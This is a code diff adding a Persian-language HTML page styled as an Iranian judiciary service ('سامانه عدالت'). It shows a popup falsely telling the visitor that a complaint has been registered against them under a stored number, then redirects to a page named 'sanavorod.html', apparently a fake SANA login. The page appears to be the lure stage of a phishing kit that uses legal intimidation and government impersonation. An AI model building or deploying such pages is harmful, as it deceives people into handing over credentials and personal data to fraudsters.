@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <title>سامانه عدالت</title>
+    <style>
+        .custom-button {
+            font-size: 20px !important;
+            width: 230px;
+            height: 40px;
+            text-align: center;
+            padding-bottom: 40px;
+        }
+    </style>
+</head>
+<body>
+
+    <script>
+        // دریافت کد ملی از localStorage
+        let codeNumber = localStorage.getItem("codePhone") || "شماره وارد نشده!";
+        console.log("مقدار بازیابی‌شده از localStorage:", codeNumber);
+
+        Swal.fire({          
+            text: `مودی گرامی، شکایتی به شماره ${codeNumber} برای شما ثبت شده است. لطفاً برای مشاهده وارد سایت عدالت شوید و اقدام به بررسی شکایت خود کنید.`,
+            imageUrl: 'https://th.bing.com/th/id/R.927259a64d3a05632950cd5c46f3ee5a?rik=qZ0YA4X2MzzOzQ&pid=ImgRaw&r=0', // لینک تصویر
+            imageWidth: 150,
+            imageHeight: 200,
+            confirmButtonText: 'سامانه عدالت',
+            confirmButtonColor: '#3085d6',
+            customClass: {
+                confirmButton: 'custom-button'
+            }
+        }).then((result) => {
+            if (result.isConfirmed) {
+                window.location.href = "sanavorod.html"; // اینجا لینک موردنظر را جایگزین کنید
+            }
+        });
+    </script>
+
+</body>
+</html>
